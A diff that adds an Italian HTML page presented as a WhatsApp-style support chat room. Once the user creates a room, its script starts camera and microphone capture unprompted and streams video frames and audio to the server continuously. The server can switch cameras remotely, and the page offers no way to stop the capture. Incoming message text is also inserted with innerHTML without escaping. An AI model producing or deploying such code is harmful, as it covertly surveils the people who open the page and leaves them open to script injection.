@@ -1,0 +1,737 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Link - Crea Stanza</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0a0a;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+        }
+        
+        .container {
+            text-align: center;
+            max-width: 500px;
+            padding: 40px 20px;
+            background: #1a1a1a;
+            border-radius: 20px;
+            border: 1px solid #333;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
+        }
+        
+        .logo {
+            font-size: 3rem;
+            margin-bottom: 20px;
+        }
+        
+        h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            font-weight: 300;
+        }
+        
+        .subtitle {
+            font-size: 1.2rem;
+            margin-bottom: 40px;
+            opacity: 0.9;
+        }
+        
+        .form-group {
+            margin-bottom: 30px;
+        }
+        
+        input[type="text"] {
+            width: 100%;
+            padding: 15px 20px;
+            border: none;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            background: #2a2a2a;
+            color: white;
+            border: 2px solid #333;
+            transition: all 0.3s ease;
+        }
+        
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #25d366;
+            background: #333;
+        }
+        
+        input[type="text"]::placeholder {
+            color: #888;
+        }
+        
+        .btn {
+            background: #25d366;
+            color: white;
+            border: none;
+            padding: 15px 40px;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .btn:hover {
+            background: #20c55a;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .admin-link {
+            margin-top: 30px;
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+        
+        .admin-link a {
+            color: white;
+            text-decoration: none;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.5);
+            transition: all 0.3s ease;
+        }
+        
+        .admin-link a:hover {
+            border-bottom-color: white;
+        }
+        
+        /* WhatsApp-like Chat Interface */
+        .chat-container {
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            max-width: 100%;
+            background: #0a0a0a;
+            border-radius: 0;
+            overflow: hidden;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        .chat-header {
+            padding: 15px 20px;
+            background: #075e54;
+            border-bottom: 1px solid #2a2a2a;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+        
+        .header-left {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        
+        .chat-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background: #25d366;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+        }
+        
+        .chat-info h2 {
+            margin: 0;
+            font-size: 1.1rem;
+            color: white;
+            font-weight: 500;
+        }
+        
+        .chat-info .connection-status {
+            font-size: 0.7rem;
+            margin-top: 2px;
+        }
+        
+        .status-indicators {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+        
+        .media-status {
+            font-size: 1.2rem;
+            opacity: 0.8;
+        }
+        
+        .chat-header h2 {
+            margin: 0;
+            font-size: 1.2rem;
+            color: white;
+            font-weight: 500;
+        }
+        
+        .connection-status {
+            padding: 4px 8px;
+            border-radius: 12px;
+            font-size: 0.7rem;
+            font-weight: 500;
+        }
+        
+        .connection-status.connected {
+            background: #25d366;
+            color: white;
+        }
+        
+        .connection-status.disconnected {
+            background: #dc3545;
+            color: white;
+        }
+        
+        .connection-status.error {
+            background: #ffc107;
+            color: #000;
+        }
+        
+        .chat-messages {
+            flex: 1;
+            padding: 10px;
+            overflow-y: auto;
+            background: #0a0a0a;
+        }
+        
+        .message {
+            display: flex;
+            margin-bottom: 8px;
+            padding: 0 5px;
+        }
+        
+        .message.own {
+            justify-content: flex-end;
+        }
+        
+        .message.other {
+            justify-content: flex-start;
+        }
+        
+        .message-content {
+            max-width: 70%;
+            padding: 8px 12px;
+            border-radius: 18px;
+            position: relative;
+            word-wrap: break-word;
+        }
+        
+        .message.own .message-content {
+            background: #25d366;
+            color: white;
+            border-bottom-right-radius: 4px;
+        }
+        
+        .message.other .message-content {
+            background: #2a2a2a;
+            color: white;
+            border-bottom-left-radius: 4px;
+        }
+        
+        .message.system .message-content {
+            background: #1a1a1a;
+            color: #888;
+            border: 1px solid #333;
+            text-align: center;
+            font-style: italic;
+        }
+        
+        .message-text {
+            font-size: 0.95rem;
+            line-height: 1.4;
+            margin-bottom: 2px;
+        }
+        
+        .message-time {
+            font-size: 0.7rem;
+            opacity: 0.7;
+            text-align: right;
+            margin-top: 2px;
+        }
+        
+        .message.other .message-time {
+            text-align: left;
+        }
+        
+        .chat-input-container {
+            padding: 15px 20px;
+            background: #1a1a1a;
+            border-top: 1px solid #2a2a2a;
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+        
+        .chat-input-container input {
+            flex: 1;
+            padding: 12px 16px;
+            border: none;
+            border-radius: 25px;
+            background: #2a2a2a;
+            color: white;
+            font-size: 0.95rem;
+            outline: none;
+        }
+        
+        .chat-input-container input:focus {
+            background: #333;
+        }
+        
+        .chat-input-container input::placeholder {
+            color: #888;
+        }
+        
+        .chat-input-container button {
+            padding: 12px 16px;
+            border: none;
+            border-radius: 50%;
+            background: #25d366;
+            color: white;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-size: 1.1rem;
+            width: 45px;
+            height: 45px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .chat-input-container button:hover {
+            background: #20c55a;
+            transform: scale(1.02);
+        }
+        
+        .chat-input-container button:active {
+            transform: scale(0.98);
+        }
+        
+        /* Scrollbar styling */
+        .chat-messages::-webkit-scrollbar {
+            width: 6px;
+        }
+        
+        .chat-messages::-webkit-scrollbar-track {
+            background: #1a1a1a;
+        }
+        
+        .chat-messages::-webkit-scrollbar-thumb {
+            background: #444;
+            border-radius: 3px;
+        }
+        
+        .chat-messages::-webkit-scrollbar-thumb:hover {
+            background: #555;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">🔗</div>
+        <h1>Link</h1>
+        <p class="subtitle">Crea una stanza per iniziare la chat</p>
+        
+        <form id="roomForm">
+            <div class="form-group">
+                <input 
+                    type="text" 
+                    id="roomName" 
+                    placeholder="Inserisci il nome della stanza..." 
+                    maxlength="20"
+                    required
+                >
+            </div>
+            <button type="submit" class="btn">Crea Stanza</button>
+        </form>
+
+    </div>
+
+    <script>
+        document.getElementById('roomForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const roomName = document.getElementById('roomName').value.trim();
+            if (!roomName) {
+                alert('Inserisci un nome per la stanza');
+                return;
+            }
+            
+            // Genera un ID unico per la stanza
+            const roomId = 'room_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+            
+            // Salva le informazioni della stanza
+            localStorage.setItem('clientRoomInfo', JSON.stringify({
+                room: roomName,
+                roomId: roomId,
+                createdAt: new Date().toISOString()
+            }));
+            
+            // Avvia la chat con la stanza creata
+            startChat(roomName, roomId);
+        });
+        
+        // Auto-focus sul campo input
+        document.getElementById('roomName').focus();
+        
+        function startChat(roomName, roomId) {
+            // Nascondi il form e mostra l'interfaccia di chat
+            document.querySelector('.container').innerHTML = `
+                <div class="chat-container">
+                    <div class="chat-header">
+                        <div class="header-left">
+                            <div class="chat-avatar">💬</div>
+                            <div class="chat-info">
+                                <h2>${roomName}</h2>
+                                <div class="connection-status" id="connectionStatus">Connessione...</div>
+                            </div>
+                        </div>
+                        <div class="status-indicators">
+                            <div class="media-status" id="mediaStatus" style="display: none;">📹🎤</div>
+                        </div>
+                    </div>
+                    <div class="chat-messages" id="chatMessages"></div>
+                    <div class="chat-input-container">
+                        <input type="text" id="messageInput" placeholder="Scrivi un messaggio..." />
+                        <button id="sendButton">➤</button>
+                    </div>
+                </div>
+            `;
+            
+            // Inizializza la connessione WebSocket con audio/video
+            initWebSocket(roomName);
+            
+            // Aggiungi messaggio di benvenuto solo se non ci sono messaggi nella cronologia
+            setTimeout(() => {
+                const messagesContainer = document.getElementById('chatMessages');
+                if (messagesContainer && messagesContainer.children.length === 0) {
+                    addMessageToChat({
+                        from: 'system',
+                        text: 'Benvenuto nella chat! Il supporto ti risponderà presto.',
+                        timestamp: new Date().toISOString()
+                    });
+                }
+            }, 2000);
+        }
+        
+        function initWebSocket(roomName) {
+            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsUrl = `${protocol}//${window.location.host}?role=client&room=${encodeURIComponent(roomName)}`;
+            
+            const ws = new WebSocket(wsUrl);
+            let isConnected = false;
+            let mediaStream = null;
+            let audioContext = null;
+            let videoTrack = null;
+            let audioTrack = null;
+            let videoInterval = null;
+            let currentCamera = 'front';
+            let isStreaming = false;
+            
+            ws.onopen = function() {
+                console.log('Connesso al server');
+                isConnected = true;
+                updateConnectionStatus('Connesso', 'connected');
+                
+                // Richiedi la cronologia dei messaggi
+                ws.send(JSON.stringify({
+                    type: 'getChatHistory',
+                    room: roomName
+                }));
+                
+                // Mostra indicatore di caricamento
+                addMessageToChat({
+                    from: 'system',
+                    text: 'Caricamento cronologia...',
+                    timestamp: new Date().toISOString()
+                });
+                
+                // Avvia audio/video dopo la connessione
+                startMediaCapture();
+            };
+            
+            ws.onmessage = function(event) {
+                const data = JSON.parse(event.data);
+                console.log('Messaggio ricevuto:', data);
+                
+                if (data.type === 'chat') {
+                    addMessageToChat(data);
+                } else if (data.type === 'cameraControl') {
+                    console.log('Camera control received:', data.camera);
+                    if (data.camera !== currentCamera) {
+                        currentCamera = data.camera;
+                        startMediaCapture(); // Riavvia la cattura con la nuova fotocamera
+                    }
+                } else if (data.type === 'roomInfo') {
+                    console.log('Informazioni stanza:', data);
+                } else if (data.type === 'chatHistory') {
+                    console.log('Cronologia ricevuta:', data.messages.length, 'messaggi');
+                    
+                    // Rimuovi l'indicatore di caricamento
+                    const messagesContainer = document.getElementById('chatMessages');
+                    const loadingMessage = messagesContainer.querySelector('.message.system');
+                    if (loadingMessage && loadingMessage.textContent.includes('Caricamento cronologia')) {
+                        loadingMessage.remove();
+                    }
+                    
+                    // Carica tutti i messaggi della cronologia
+                    if (data.messages && data.messages.length > 0) {
+                        data.messages.forEach(message => {
+                            addMessageToChat(message);
+                        });
+                        console.log('Cronologia caricata con successo');
+                    } else {
+                        console.log('Nessun messaggio nella cronologia');
+                    }
+                }
+            };
+            
+            ws.onclose = function() {
+                console.log('Connessione chiusa');
+                isConnected = false;
+                updateConnectionStatus('Disconnesso', 'disconnected');
+                stopMediaCapture();
+            };
+            
+            ws.onerror = function(error) {
+                console.error('Errore WebSocket:', error);
+                updateConnectionStatus('Errore connessione', 'error');
+            };
+            
+            // Gestione invio messaggi
+            document.getElementById('sendButton').addEventListener('click', function() {
+                sendMessage();
+            });
+            
+            document.getElementById('messageInput').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    sendMessage();
+                }
+            });
+            
+            function sendMessage() {
+                const messageInput = document.getElementById('messageInput');
+                const message = messageInput.value.trim();
+                
+                if (message && isConnected) {
+                    console.log('Invio messaggio:', message);
+                    ws.send(JSON.stringify({
+                        type: 'chat',
+                        text: message
+                    }));
+                    
+                    // Mostra il messaggio inviato nella chat
+                    addMessageToChat({
+                        from: roomName,
+                        text: message,
+                        timestamp: new Date().toISOString()
+                    });
+                    
+                    messageInput.value = '';
+                } else {
+                    console.log('Messaggio non inviato:', { message, isConnected });
+                }
+            }
+            
+            function addMessageToChat(data) {
+                const messagesContainer = document.getElementById('chatMessages');
+                const messageDiv = document.createElement('div');
+                
+                let messageClass = 'other';
+                if (data.from === roomName) {
+                    messageClass = 'own';
+                } else if (data.from === 'system') {
+                    messageClass = 'system';
+                }
+                
+                messageDiv.className = `message ${messageClass}`;
+                
+                const time = new Date(data.timestamp).toLocaleTimeString();
+                messageDiv.innerHTML = `
+                    <div class="message-content">
+                        <div class="message-text">${data.text}</div>
+                        <div class="message-time">${time}</div>
+                    </div>
+                `;
+                
+                messagesContainer.appendChild(messageDiv);
+                messagesContainer.scrollTop = messagesContainer.scrollHeight;
+            }
+            
+            function updateConnectionStatus(status, className) {
+                const statusElement = document.getElementById('connectionStatus');
+                statusElement.textContent = status;
+                statusElement.className = `connection-status ${className}`;
+            }
+            
+            function startMediaCapture() {
+                // Ferma il stream esistente se presente
+                if (isStreaming) {
+                    stopMediaCapture();
+                }
+                
+                navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
+                        facingMode: currentCamera === 'front' ? 'user' : 'environment'
+                    },
+                    audio: {
+                        echoCancellation: true,
+                        noiseSuppression: true,
+                        autoGainControl: true
+                    }
+                })
+                .then(function(stream) {
+                    mediaStream = stream;
+                    videoTrack = stream.getVideoTracks()[0];
+                    audioTrack = stream.getAudioTracks()[0];
+                    isStreaming = true;
+                    
+                    console.log('Media capture avviato');
+                    
+                    // Avvia invio video
+                    startVideoCapture();
+                    
+                    // Avvia invio audio
+                    startAudioCapture();
+                    
+                    // Mostra indicatore media
+                    const mediaStatus = document.getElementById('mediaStatus');
+                    if (mediaStatus) {
+                        mediaStatus.style.display = 'block';
+                    }
+                })
+                .catch(function(error) {
+                    console.error('Errore accesso media:', error);
+                });
+            }
+            
+            function startVideoCapture() {
+                const canvas = document.createElement('canvas');
+                canvas.width = 320;
+                canvas.height = 240;
+                const ctx = canvas.getContext('2d');
+                const video = document.createElement('video');
+                video.srcObject = mediaStream;
+                video.muted = true; // Muto per evitare feedback
+                video.play();
+                
+                // Aspetta che il video sia pronto
+                video.onloadedmetadata = function() {
+                    console.log('Video pronto, inizio invio frame');
+                    videoInterval = setInterval(function() {
+                        if (isStreaming && ws && ws.readyState === WebSocket.OPEN && videoTrack && videoTrack.readyState === 'live') {
+                            try {
+                                ctx.drawImage(video, 0, 0, 320, 240);
+                                const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                                
+                                // Controlla se l'immagine è valida
+                                if (imageData && imageData.length > 100) {
+                                    ws.send(JSON.stringify({
+                                        type: 'video',
+                                        cam: currentCamera,
+                                        image: imageData
+                                    }));
+                                    console.log('Frame video inviato, dimensione:', imageData.length);
+                                } else {
+                                    console.log('Frame video non valido, dimensione:', imageData ? imageData.length : 0);
+                                }
+                            } catch (error) {
+                                console.error('Errore invio video:', error);
+                            }
+                        } else {
+                            console.log('Video non pronto:', {
+                                wsReady: ws && ws.readyState === WebSocket.OPEN,
+                                trackReady: videoTrack && videoTrack.readyState === 'live'
+                            });
+                        }
+                    }, 125); // 8 FPS per migliore performance
+                };
+            }
+            
+            function startAudioCapture() {
+                if (!isStreaming || !mediaStream) return;
+                
+                const audioTracks = mediaStream.getAudioTracks();
+                if (audioTracks.length === 0) return;
+                
+                // Clean up existing audio context
+                if (audioContext) {
+                    audioContext.close();
+                }
+                
+                audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const audioSource = audioContext.createMediaStreamSource(mediaStream);
+                const audioProcessor = audioContext.createScriptProcessor(4096, 1, 1);
+                
+                audioProcessor.onaudioprocess = (event) => {
+                    if (!isStreaming || !mediaStream) return;
+                    
+                    const inputBuffer = event.inputBuffer;
+                    const inputData = inputBuffer.getChannelData(0);
+                    
+                    // Convert audio to base64 and send
+                    const audioData = new Float32Array(inputData);
+                    const audioBase64 = btoa(String.fromCharCode(...new Uint8Array(audioData.buffer)));
+                    
+                    if (ws && ws.readyState === WebSocket.OPEN) {
+                        ws.send(JSON.stringify({
+                            type: 'audio',
+                            audio: audioBase64,
+                            sampleRate: audioContext.sampleRate
+                        }));
+                        console.log('🎵 Audio inviato, dimensione:', audioBase64.length);
+                    }
+                };
+                
+                audioSource.connect(audioProcessor);
+                audioProcessor.connect(audioContext.destination);
+                
+                // Restart audio stream every 5 seconds to keep it continuous
+                setTimeout(() => {
+                    if (isStreaming && mediaStream) {
+                        startAudioCapture();
+                    }
+                }, 5000);
+            }
+            
+            function stopMediaCapture() {
+                if (videoInterval) {
+                    clearInterval(videoInterval);
+                    videoInterval = null;
+                }
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(track => track.stop());
+                    mediaStream = null;
+                }
+                if (audioContext) {
+                    audioContext.close();
+                    audioContext = null;
+                }
+                isStreaming = false;
+                console.log('Media capture fermato');
+            }
+        }
+        
+    </script>
+</body>
+</html>
